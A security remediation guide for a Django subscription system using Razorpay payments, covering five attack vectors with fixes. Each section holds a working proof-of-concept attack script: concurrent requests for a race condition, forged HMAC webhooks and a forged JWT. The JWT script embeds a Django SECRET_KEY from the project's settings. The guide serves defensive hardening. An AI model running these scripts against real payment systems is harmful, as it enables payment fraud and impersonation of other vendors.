# Attack Vector Fixes for Subscription System

## Attack #1: Payment Signature Replay Attack

### Vulnerability
Attacker reuses valid payment signatures to activate subscriptions without paying.

### Fix Implementation

#### Step 1: Add signature uniqueness constraint
```python
# apps/subscriptions/models.py
class PaymentTransaction(models.Model):
    # ... existing fields ...
    razorpay_payment_id = models.CharField(max_length=255, blank=True, null=True, unique=True)  # ✅ Add unique=True
    razorpay_signature = models.CharField(max_length=255, blank=True, null=True, unique=True)   # ✅ Add unique=True
    
    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['vendor', 'status']),
            models.Index(fields=['razorpay_order_id']),
            models.Index(fields=['razorpay_payment_id']),  # ✅ Index for fast lookup
        ]
        constraints = [
            models.UniqueConstraint(
                fields=['razorpay_payment_id', 'razorpay_signature'],
                name='unique_payment_signature_combo'
            )
        ]
```

#### Step 2: Add signature reuse check in verify_payment
```python
# apps/subscriptions/views.py - Add before signature verification
@api_view(["POST"])
@permission_classes([IsAuthenticated])
def verify_payment(request):
    data = request.data
    payment_id = data.get("razorpay_payment_id") or data.get("payment_id")
    order_id = data.get("razorpay_order_id") or data.get("order_id")
    signature = data.get("razorpay_signature") or data.get("signature")

    if not all([payment_id, order_id, signature]):
        return error_response("Missing payment verification fields", status.HTTP_400_BAD_REQUEST)

    vendor, err = get_request_vendor_or_404(request)
    if err:
        return err

    # ✅ CHECK 1: Has this payment_id been used before?
    if PaymentTransaction.objects.filter(razorpay_payment_id=payment_id).exclude(razorpay_order_id=order_id).exists():
        logger.error(f"🚨 REPLAY ATTACK DETECTED: payment_id {payment_id} already used for different order")
        return error_response(
            "This payment ID has already been used. Contact support if this is an error.",
            status.HTTP_400_BAD_REQUEST
        )
    
    # ✅ CHECK 2: Has this exact signature been used before?
    if PaymentTransaction.objects.filter(razorpay_signature=signature).exclude(razorpay_order_id=order_id).exists():
        logger.error(f"🚨 SIGNATURE REPLAY DETECTED: signature reused for different order")
        return error_response(
            "Invalid payment signature. Possible replay attack detected.",
            status.HTTP_400_BAD_REQUEST
        )

    # Continue with normal signature verification...
    try:
        client = get_razorpay_client()
        if client is None:
            return error_response("Payment gateway not configured.", status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        client.utility.verify_payment_signature({
            "razorpay_order_id": order_id,
            "razorpay_payment_id": payment_id,
            "razorpay_signature": signature,
        })
        logger.info(f"✅ Payment signature verified for order {order_id}")
    except razorpay.errors.SignatureVerificationError as e:
        logger.error(f"❌ Payment signature verification failed: {str(e)}")
        return error_response("Payment signature verification failed", status.HTTP_400_BAD_REQUEST)
    
    # Rest of the code...
```

---

## Attack #2: Race Condition - Concurrent Verify Payment Requests

### Vulnerability
Attacker sends 10 simultaneous verify_payment requests to create multiple subscriptions from one payment.

### Attack Code
```python
import asyncio
import aiohttp

async def exploit_race_condition():
    """Send multiple concurrent requests to exploit race condition"""
    
    payload = {
        "razorpay_payment_id": "pay_valid123",
        "razorpay_order_id": "order_valid456",
        "razorpay_signature": "valid_signature"
    }
    
    headers = {"Authorization": "Bearer <jwt_token>"}
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        # Send 20 concurrent requests
        for i in range(20):
            task = session.post(
                "https://yourapi.com/api/subscriptions/verify-payment/",
                json=payload,
                headers=headers
            )
            tasks.append(task)
        
        # Execute all at once
        responses = await asyncio.gather(*tasks)
        
        # Check if multiple subscriptions created
        for i, resp in enumerate(responses):
            print(f"Request {i}: {resp.status}")
```

### Fix: Database-Level Locking with select_for_update
```python
# apps/subscriptions/views.py
from django.db import transaction

@api_view(["POST"])
@permission_classes([IsAuthenticated])
def verify_payment(request):
    # ... validation code ...
    
    # ✅ Use select_for_update to prevent race conditions
    try:
        with transaction.atomic():
            # Lock the payment transaction row until this transaction completes
            payment_txn = PaymentTransaction.objects.select_for_update().select_related('plan', 'vendor').get(
                razorpay_order_id=order_id,
                vendor=vendor
            )
            
            # Double-check status within the locked transaction
            if payment_txn.status in ['captured', 'authorized']:
                logger.warning(f"⚠️ Race condition prevented: payment already processed")
                existing_sub = Subscription.objects.filter(vendor=vendor).first()
                return Response({
                    "detail": "Payment already processed.",
                    "subscription": SubscriptionSerializer(existing_sub).data if existing_sub else None,
                }, status=status.HTTP_200_OK)
            
            # Mark as processing immediately to prevent concurrent updates
            payment_txn.status = 'processing'
            payment_txn.save(update_fields=['status'])
            
    except PaymentTransaction.DoesNotExist:
        return error_response("Payment transaction not found", status.HTTP_404_NOT_FOUND)
    
    # Signature verification (outside lock to avoid holding lock during API call)
    try:
        client = get_razorpay_client()
        client.utility.verify_payment_signature({
            "razorpay_order_id": order_id,
            "razorpay_payment_id": payment_id,
            "razorpay_signature": signature,
        })
    except razorpay.errors.SignatureVerificationError as e:
        # Rollback status on failure
        with transaction.atomic():
            payment_txn = PaymentTransaction.objects.select_for_update().get(id=payment_txn.id)
            payment_txn.status = 'failed'
            payment_txn.error_message = f"Signature verification failed: {str(e)}"
            payment_txn.save()
        return error_response("Payment signature verification failed", status.HTTP_400_BAD_REQUEST)
    
    # Continue with subscription activation in atomic block
    try:
        with transaction.atomic():
            payment_txn = PaymentTransaction.objects.select_for_update().get(id=payment_txn.id)
            payment_txn.razorpay_payment_id = payment_id
            payment_txn.razorpay_signature = signature
            payment_txn.status = 'captured'
            payment_txn.verified_at = timezone.now()
            payment_txn.save()
            
            # Use get_or_create with defaults to ensure only one subscription
            plan = payment_txn.plan
            start_date = timezone.now()
            end_date = start_date + timezone.timedelta(days=plan.duration_days)
            
            sub, created = Subscription.objects.get_or_create(
                vendor=vendor,
                defaults={
                    'plan': plan,
                    'transaction': payment_txn,
                    'start_date': start_date,
                    'end_date': end_date,
                    'is_active': True,
                    'amount': decimal.Decimal(payment_txn.amount) / 100,
                    'order_id': order_id,
                    'payment_id': payment_id,
                }
            )
            
            # If not created, update existing
            if not created:
                sub.plan = plan
                sub.transaction = payment_txn
                sub.end_date = end_date
                sub.is_active = True
                sub.save()
            
            return Response({
                "success": True,
                "detail": "Payment verified successfully",
                "subscription": SubscriptionSerializer(sub).data,
            }, status=status.HTTP_200_OK)
            
    except Exception as e:
        logger.exception("Error activating subscription")
        return error_response("Failed to activate subscription", status.HTTP_500_INTERNAL_SERVER_ERROR)
```

---

## Attack #3: Amount Tampering - Pay ₹1 for Premium Plan

### Vulnerability
Attacker modifies frontend code to create Razorpay order with ₹1 instead of actual plan price.

### Attack Code
```javascript
// Attacker's modified frontend code
const createOrder = async () => {
    // Intercept and modify request
    const response = await fetch('/api/subscriptions/create-order/', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({
            plan_id: 3,  // Premium plan (₹999)
            // Attacker hopes backend doesn't validate
        })
    });
    
    const data = await response.json();
    
    // Manually create Razorpay order with modified amount
    const razorpayOrder = await razorpay.orders.create({
        amount: 100,  // ₹1 instead of ₹999
        currency: 'INR',
        payment_capture: 1
    });
    
    // Complete payment with tampered order
    payWithRazorpay(razorpayOrder.id);
};
```

### Fix: Backend Amount Verification
```python
# apps/subscriptions/views.py

@api_view(["POST"])
@permission_classes([IsAuthenticated])
def verify_payment(request):
    # ... existing validation ...
    
    try:
        with transaction.atomic():
            payment_txn = PaymentTransaction.objects.select_for_update().select_related('plan', 'vendor').get(
                razorpay_order_id=order_id,
                vendor=vendor
            )
            
            # ✅ CRITICAL: Verify payment amount matches expected plan price
            client = get_razorpay_client()
            if client:
                try:
                    # Fetch actual payment details from Razorpay
                    razorpay_payment = client.payment.fetch(payment_id)
                    actual_amount_paid = razorpay_payment['amount']  # in paise
                    expected_amount = payment_txn.amount  # from our transaction
                    
                    if actual_amount_paid != expected_amount:
                        logger.error(
                            f"🚨 AMOUNT TAMPERING DETECTED: "
                            f"Expected {expected_amount} paise, but {actual_amount_paid} paise paid"
                        )
                        payment_txn.status = 'failed'
                        payment_txn.error_message = f"Amount mismatch: expected {expected_amount}, got {actual_amount_paid}"
                        payment_txn.save()
                        
                        return error_response(
                            "Payment amount does not match plan price. Transaction rejected.",
                            status.HTTP_400_BAD_REQUEST,
                            {"expected": expected_amount, "received": actual_amount_paid}
                        )
                    
                    logger.info(f"✅ Amount verification passed: {actual_amount_paid} paise")
                    
                except razorpay.errors.BadRequestError as e:
                    logger.error(f"Failed to fetch payment details: {str(e)}")
                    return error_response("Could not verify payment details", status.HTTP_400_BAD_REQUEST)
            
            # Continue with normal flow...
```

### Additional Fix: Verify in Webhook Too
```python
# apps/subscriptions/views.py - razorpay_webhook function

if event_type == "payment.captured":
    payment = event["payload"]["payment"]["entity"]
    order_id = payment.get("order_id")
    payment_id = payment.get("id")
    actual_amount = payment.get("amount")  # ✅ Get amount from webhook
    
    try:
        payment_txn = PaymentTransaction.objects.select_related('plan', 'vendor').get(
            razorpay_order_id=order_id
        )
        
        # ✅ Verify amount in webhook
        if actual_amount != payment_txn.amount:
            logger.error(
                f"🚨 WEBHOOK AMOUNT MISMATCH: "
                f"Expected {payment_txn.amount}, got {actual_amount}"
            )
            payment_txn.status = 'failed'
            payment_txn.error_message = f"Webhook amount mismatch"
            payment_txn.save()
            return Response({"status": "rejected"}, status=status.HTTP_400_BAD_REQUEST)
        
        # Continue with activation...
```

---

## Attack #4: Webhook Spoofing with Stolen Secret

### Vulnerability
If RAZORPAY_WEBHOOK_SECRET is leaked, attacker sends fake webhooks to activate subscriptions.

### Attack Code
```python
import hmac
import hashlib
import json
import requests

# Attacker obtained webhook secret (e.g., from leaked .env file)
STOLEN_WEBHOOK_SECRET = "webhook_secret_from_leak"

def generate_fake_webhook():
    """Generate fake webhook with valid signature"""
    
    fake_payload = {
        "event": "payment.captured",
        "payload": {
            "payment": {
                "entity": {
                    "id": "pay_fake12345",
                    "order_id": "order_attacker789",
                    "amount": 99900,  # ₹999
                    "status": "captured"
                }
            }
        }
    }
    
    payload_bytes = json.dumps(fake_payload).encode('utf-8')
    
    # Generate valid HMAC signature
    signature = hmac.new(
        STOLEN_WEBHOOK_SECRET.encode('utf-8'),
        payload_bytes,
        hashlib.sha256
    ).hexdigest()
    
    # Send fake webhook
    response = requests.post(
        "https://yourapi.com/api/subscriptions/webhook/",
        json=fake_payload,
        headers={"X-Razorpay-Signature": signature}
    )
    
    print(f"Fake webhook sent: {response.status_code}")

# Attacker creates order via API, never pays, then sends fake webhook
def exploit_workflow():
    # Step 1: Create legitimate order
    create_response = requests.post(
        "https://yourapi.com/api/subscriptions/create-order/",
        json={"plan_id": 3},
        headers={"Authorization": "Bearer <jwt>"}
    )
    order_id = create_response.json()['order_id']
    
    # Step 2: Don't pay! Instead, send fake webhook
    fake_webhook = {
        "event": "payment.captured",
        "payload": {
            "payment": {
                "entity": {
                    "id": "pay_fake_999",
                    "order_id": order_id,  # Use real order
                    "amount": 99900,
                    "status": "captured"
                }
            }
        }
    }
    
    # Generate signature with stolen secret
    payload_str = json.dumps(fake_webhook)
    signature = hmac.new(
        STOLEN_WEBHOOK_SECRET.encode(),
        payload_str.encode(),
        hashlib.sha256
    ).hexdigest()
    
    # Send webhook
    requests.post(
        "https://yourapi.com/api/subscriptions/webhook/",
        json=fake_webhook,
        headers={"X-Razorpay-Signature": signature}
    )
```

### Fix: Multiple Layers of Defense
```python
# 1. Environment hardening - Never commit secrets
# .env.example (not actual .env)
RAZORPAY_WEBHOOK_SECRET=generate_random_256_bit_secret_here

# 2. IP Whitelisting in webhook endpoint
# apps/subscriptions/views.py

RAZORPAY_WEBHOOK_IPS = [
    '3.111.198.88',
    '13.232.253.10', 
    '52.66.187.44',
    # Add all Razorpay webhook IPs from their documentation
]

@csrf_exempt
@api_view(["POST"])
@permission_classes([AllowAny])
def razorpay_webhook(request):
    # ✅ CHECK 1: Verify request comes from Razorpay IP
    client_ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', '')).split(',')[0].strip()
    
    if settings.ENVIRONMENT == 'production' and client_ip not in RAZORPAY_WEBHOOK_IPS:
        logger.error(f"🚨 WEBHOOK FROM UNAUTHORIZED IP: {client_ip}")
        return Response({"status": "forbidden"}, status=status.HTTP_403_FORBIDDEN)
    
    # ✅ CHECK 2: Verify webhook signature
    try:
        payload = request.body
        signature = request.headers.get("X-Razorpay-Signature")
        webhook_secret = getattr(settings, "RAZORPAY_WEBHOOK_SECRET", None)

        if not webhook_secret:
            logger.error("RAZORPAY_WEBHOOK_SECRET not configured")
            return Response({"status": "error"}, status=500)

        client = get_razorpay_client()
        if client is None:
            return Response({"status": "error"}, status=500)
        
        client.utility.verify_webhook_signature(payload.decode('utf-8'), signature, webhook_secret)
        event = json.loads(payload)
        
    except razorpay.errors.SignatureVerificationError as e:
        logger.error(f"❌ Invalid webhook signature: {str(e)}")
        return Response({"status": "error"}, status=400)
    
    event_type = event.get("event")
    event_id = event.get("id")
    
    # ✅ CHECK 3: Cross-verify with Razorpay API
    if event_type == "payment.captured":
        payment = event["payload"]["payment"]["entity"]
        payment_id = payment.get("id")
        order_id = payment.get("order_id")
        
        # Verify this payment actually exists in Razorpay's system
        try:
            client = get_razorpay_client()
            verified_payment = client.payment.fetch(payment_id)
            
            # Cross-check key details
            if verified_payment['order_id'] != order_id:
                logger.error(f"🚨 WEBHOOK DATA MISMATCH: order_id doesn't match")
                return Response({"status": "rejected"}, status=400)
            
            if verified_payment['status'] != 'captured':
                logger.error(f"🚨 PAYMENT NOT CAPTURED: status is {verified_payment['status']}")
                return Response({"status": "rejected"}, status=400)
            
            logger.info(f"✅ Payment cross-verified with Razorpay API")
            
        except razorpay.errors.BadRequestError:
            logger.error(f"🚨 FAKE PAYMENT ID: {payment_id} doesn't exist in Razorpay")
            return Response({"status": "rejected"}, status=400)
    
    # Continue with normal webhook processing...
```

---

## Attack #5: JWT Token Manipulation to Activate Another Vendor's Subscription

### Vulnerability
Attacker modifies JWT payload to impersonate another vendor.

### Attack Code
```python
import jwt
import base64
import json

# Attacker's JWT (valid for their account)
legit_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode without verification to see structure
parts = legit_token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print(f"Original payload: {payload}")
# {'user_id': 5, 'username': 'attacker', 'exp': 1699453200}

# Attempt 1: Modify user_id to target another vendor
payload['user_id'] = 10  # Target victim vendor
payload['username'] = 'victim'

# Try to re-sign with guessed/leaked/weak SECRET_KEY
SECRET_KEY = "django-insecure-vd3b_wa*#xd7k*pewu5071!rpr!p8z)+pca@cpp&fu%t#gb%^@"  # From your settings.py!

forged_token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# Use forged token to activate victim's subscription
import requests
response = requests.post(
    "https://yourapi.com/api/subscriptions/verify-payment/",
    json={
        "razorpay_payment_id": "pay_attacker_paid",
        "razorpay_order_id": "order_victim_created",  # Victim's order
        "razorpay_signature": "valid_signature_from_attacker_payment"
    },
    headers={"Authorization": f"Bearer {forged_token}"}
)
```

### Fix: Multiple Security Layers
```python
# 1. CRITICAL: Fix SECRET_KEY immediately
# marketplace/settings.py

import secrets

SECRET_KEY = os.getenv('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    if DEBUG:
        SECRET_KEY = 'dev-only-key-' + secrets.token_urlsafe(50)
        logger.warning("Using auto-generated SECRET_KEY for development")
    else:
        raise ValueError("DJANGO_SECRET_KEY must be set in production")

# Generate a new key: python -c 'import secrets; print(secrets.token_urlsafe(50))'

# 2. Add vendor ownership verification in verify_payment
# apps/subscriptions/views.py

@api_view(["POST"])
@permission_classes([IsAuthenticated])
def verify_payment(request):
    data = request.data
    payment_id = data.get("razorpay_payment_id")
    order_id = data.get("razorpay_order_id")
    signature = data.get("razorpay_signature")

    vendor, err = get_request_vendor_or_404(request)
    if err:
        return err

    # Signature verification...
    
    try:
        with transaction.atomic():
            # ✅ CRITICAL: Verify this order belongs to THIS vendor
            payment_txn = PaymentTransaction.objects.select_for_update().select_related('vendor').get(
                razorpay_order_id=order_id,
                vendor=vendor  # Must match authenticated user's vendor
            )
            
            # ✅ Additional check: Ensure vendor from token matches transaction vendor
            if payment_txn.vendor.id != vendor.id:
                logger.error(
                    f"🚨 OWNERSHIP VIOLATION: User {request.user.id} (vendor {vendor.id}) "
                    f"tried to verify payment for vendor {payment_txn.vendor.id}"
                )
                return error_response(
                    "You are not authorized to verify this payment.",
                    status.HTTP_403_FORBIDDEN
                )
            
            # ✅ Check: Ensure vendor from token matches user's actual vendor
            if request.user.vendor.id != vendor.id:
                logger.error(f"🚨 TOKEN MANIPULATION: Vendor mismatch detected")
                return error_response(
                    "Authentication error. Please login again.",
                    status.HTTP_401_UNAUTHORIZED
                )
            
            # Continue with payment verification...
            
    except PaymentTransaction.DoesNotExist:
        logger.error(
            f"🚨 CROSS-VENDOR ATTACK: User {request.user.id} tried to access "
            f"order {order_id} which doesn't exist or doesn't belong to them"
        )
        return error_response(
            "Payment transaction not found or unauthorized.",
            status.HTTP_404_NOT_FOUND
        )

# 3. Add JWT claims validation
# Create custom JWT claims
# marketplace/settings.py

SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(hours=1),  # Reduced from 10 hours
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
    'UPDATE_LAST_LOGIN': True,  # ✅ Track login activity
    
    # ✅ Add custom claims
    'TOKEN_OBTAIN_SERIALIZER': 'apps.users.serializers.CustomTokenObtainPairSerializer',
}

# apps/users/serializers.py
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer

class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        
        # Add custom claims
        token['username'] = user.username
        token['role'] = user.role
        token['email'] = user.email
        
        # ✅ Add vendor ID if vendor
        if hasattr(user, 'vendor') and user.vendor:
            token['vendor_id'] = user.vendor.id
        else:
            token['vendor_id'] = None
        
        return token

# 4. Verify token claims in permission class
# apps/subscriptions/permissions.py

class IsSubscribed(BasePermission):
    message = "Your subscription is not active."

    def has_permission(self, request, view):
        # ✅ Verify JWT claims match actual user
        if hasattr(request.auth, 'payload'):
            token_vendor_id = request.auth.payload.get('vendor_id')
            actual_vendor = getattr(request.user, 'vendor', None)
            
            if actual_vendor and token_vendor_id != actual_vendor.id:
                logger.error(
                    f"🚨 JWT CLAIM MISMATCH: Token claims vendor {token_vendor_id} "
                    f"but user has vendor {actual_vendor.id}"
                )
                return False
        
        vendor = getattr(request.user, "vendor", None)
        if not vendor:
            return False
        
        sub = getattr(vendor, "subscription", None)
        if not sub:
            return False
        
        return sub.is_active and sub.end_date and sub.end_date > timezone.now()
```

---

## Summary of Fixes

| Attack Vector | Risk Level | Fix Priority | Estimated Time |
|--------------|-----------|--------------|----------------|
| Payment Signature Replay | 🔴 Critical | Immediate | 2 hours |
| Race Condition | 🔴 Critical | Immediate | 3 hours |
| Amount Tampering | 🔴 Critical | Immediate | 4 hours |
| Webhook Spoofing | 🟠 High | 24 hours | 6 hours |
| JWT Manipulation | 🔴 Critical | Immediate | 1 hour |

**Total Implementation Time: ~16 hours**

## Testing Attack Fixes

```bash
# Run after implementing fixes
python manage.py test apps.subscriptions.tests.test_security
python manage.py test apps.subscriptions.tests.test_race_conditions
python manage.py test apps.subscriptions.tests.test_payment_validation
```
